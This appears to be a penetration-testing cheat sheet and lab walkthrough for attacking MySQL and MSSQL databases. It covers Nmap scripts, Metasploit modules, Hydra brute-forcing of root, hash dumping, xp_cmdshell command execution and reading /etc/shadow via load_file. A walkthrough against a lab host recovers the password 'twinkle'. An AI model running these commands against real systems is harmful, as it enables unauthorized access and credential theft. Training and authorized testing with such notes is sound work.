♦ MySQL & MSSQL Enumeration
SQL (Structured Query Language) is used to manage and manipulate databases.
→ Microsoft SQL Server (MSSQL): Port 1433
→ MySQL: Port 3306
→ PostgreSQL: Port 5432

♦ MySQL Command-Line Enumeration
The built-in 'mysql' tool is used for direct database interaction and information retrieval.

→ mysql -h <target> -u <user>                                  # Connects to a MySQL database server at <target> with the specified <user>.
→ MySQL [(none)]> use <database>;                              # Connects to the specified database.
→ MySQL [books]> select count(*) from authors;                 # Counts the number of records in the 'authors' table.
→ MySQL [books]> select * from authors;                        # Retrieves all records from the 'authors' table.
→ MySQL [(none)]> select load_file("/etc/shadow");             # Attempts to read the contents of a file (security check).

♦ Nmap Scripting Engine (NSE) - MSSQL Scripts (Port 1433)
These scripts target Microsoft SQL Server instances for detailed enumeration and vulnerability checking.

→ nmap --script ms-sql-info <target>                                                                                                            # Gather basic information about MSSQL instances.
→ nmap --script ms-sql-ntlm-info --script-args mssql.instance-port=1443 192.168.1.10                                                            # Gather NTLM authentication info.
→ nmap --script ms-sql-empty-password <target>                                                                                                  # Detect MSSQL instances with empty (blank) passwords.
→ nmap --script ms-sql-brute --script-args userdb=<dir_path>,passdb=<dir_path> <target>                                                         # Perform brute-force attacks.
→ nmap --script ms-sql-dump-hashes --script-args mssql.username=<username>,mssql.password=<password> <target>                                   # Dump password hashes.
→ nmap --script ms-sql-query --script-args mssql.username=<username>,mssql.password=<password>,ms-sql-query.query="..." -oN output.txt <target> # Execute a specific SQL query.
→ nmap --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=pass,ms-sql-xp-cmdshell.cmd="ifconfig" 192.168.1.10        # Execute command via xp_cmdshell.

♦ Nmap Scripting Engine (NSE) - MySQL Scripts (Port 3306)
These scripts target MySQL servers for information gathering and security auditing.

→ nmap --script mysql-empty-password <target>                                                  # Detect MySQL servers with empty (blank) passwords.
→ nmap --script mysql-empty-info <target>                                                      # Determine if MySQL servers provide empty password information.
→ nmap --script mysql-users --script-args="mysqluser='root',mysqlpass=''" <target>             # Identify MySQL users.
→ nmap --script mysql-databases --script-args="mysqluser='root',mysqlpass=''" <target>         # Enumerate MySQL databases.
→ nmap --script mysql-variables --script-args="mysqluser='root',mysqlpass=''" <target>         # Retrieve MySQL server variables.
→ nmap --script mysql-dump-hashes --script-args="mysqluser='root',mysqlpass=''" <target>       # Dump MySQL password hashes.
→ nmap --script mysql-audit --script-args="mysqluser='root',mysqlpass=''" <target>             # Perform a basic MySQL security audit.
→ nmap --script mysql-query --script-args="query='...',username='root',password=''" <target>    # Execute a specific SQL query.
→ nmap --script mysql-audit --script-args="mysql-audit.username='root',mysql-audit.password='',mysql-audit.filename='...'" <target> # Perform security audit with a specified audit file.

♦ Metasploit (msfconsole) Enumeration Modules
Modules used within the Metasploit Framework for database security assessment.

→ use auxiliary/scanner/mssql/mssql_login              # Perform login attempts on MSSQL instances.
→ use auxiliary/admin/mssql/mssql_enum_sql_logins      # Enumerate SQL Server logins (MSSQL).
→ use auxiliary/admin/mssql/mssql_exec                 # Execute arbitrary SQL commands (MSSQL).
→ use auxiliary/admin/mssql/mssql_enum_domain_accounts # Enumerate domain accounts (MSSQL).
→ use auxiliary/scanner/mysql/mysql_login              # Perform login attempts on MySQL servers.
→ use auxiliary/scanner/mysql/mysql_writable_dirs      # Scan for MySQL databases with writable directories.
→ use auxiliary/scanner/mysql/mysql_hashdump           # Retrieve password hashes from a MySQL database.

♦ Dictionary Attack (Hydra)
→ hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <target> mysql                   # Brute-force attack on MySQL using Hydra.

♦ MySQL Enumeration and Attack

Port → 3306                                # Default port for MySQL
target IP → 192.143.6.3                    # The target machine's IP address
ifconfig → 192.143.6.2                     # Your local IP address
→ service postgresql start                 # Start the required database service for Metasploit
→ msfconsole                               # Start the Metasploit Framework console
→ workspace -a MYSQL_Enum                  # Create and switch to a Metasploit workspace
→ setg RHOSTS 192.143.6.3                  # Globally set the target IP (RHOSTS)
→ setg RHOST 192.143.6.3                   # Set RHOST (for single host modules)

♦ MySQL Version Scanning
→ Search type:auxiliary name:mysql           # Search for MySQL-related auxiliary modules
→ Use auxiliary/scanner/mysql/mysql_version  # Load the MySQL version scanner module
→ Show options                             # View required options
→ run                                      # Execute the module

♦ MySQL Login Brute-Force (Using mysql_login)
→ Search mysql_login                       # Search for the brute-force login module
→ Use auxiliary/scanner/mysql/mysql_login    # Load the MySQL login brute-forcer module
→ Show options                             # View required options
→ Set USERNAME root                        # Set the username to 'root'
→ Set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt # Set the path to the password wordlist
→ Set VERBOSE false                        # Disable verbose output
→ run                                      # Execute the brute-force attack

♦ MySQL User Enumeration (Using mysql_enum)
→ Search mysql-enum
→ Use auxiliary/scanner/mysql/mysql_enum
→ info
→ Set PASSWORD twinkle
→ Set USERNAME root
→ run

♦ MySQL Post-Exploitation (Successful Login: root/twinkle)
These commands are used after a successful login to gather data.

→ Search mysql_sql                         # Search for the module to execute SQL commands
→ Use auxiliary/admin/mysql/mysql_sql      # Load the module for executing arbitrary SQL
→ Show options                             # View options
→ Set PASSWORD twinkle
→ Set USERNAME root
→ run                                      # Execute the module to list databases, show schemas, etc.
→ Set SQL show databases;                  # Set the SQL command to list all databases
→ run
→ Set SQL use videos; show videos;         # Set multiple SQL commands (e.g., use a database and show tables)
→ run

♦ Schema Dump (Retrieving Database Structure)
→ Search mysql_schema
→ Use auxiliary/scanner/mysql/mysql_schemadump # Load the module to dump the database schema
→ Show options
→ Set USERNAME root
→ Set PASSWORD twinkle
→ run

♦ Credentials and Host Management (Metasploit Console)
These commands are used to view collected information in the Metasploit session.

→ hosts                                    # List hosts discovered/scanned in the current workspace
→ services                                 # List services discovered on the hosts
→ loot                                     # List collected loot (files, hashes, screenshots, etc.)
→ creds                                    # List harvested credentials

♦ Direct Command-Line Access (External Tool)
This command demonstrates connecting to the server using the native `mysql` tool with found credentials.

→ exit                                     # Exit the msfconsole
→ mysql -h 192.143.6.3 -u root -p          # Connect to the target MySQL server using the 'root' user (will prompt for password)
(password: twinkle)
→ show databases;                          # Execute an arbitrary command in the native MySQL shell
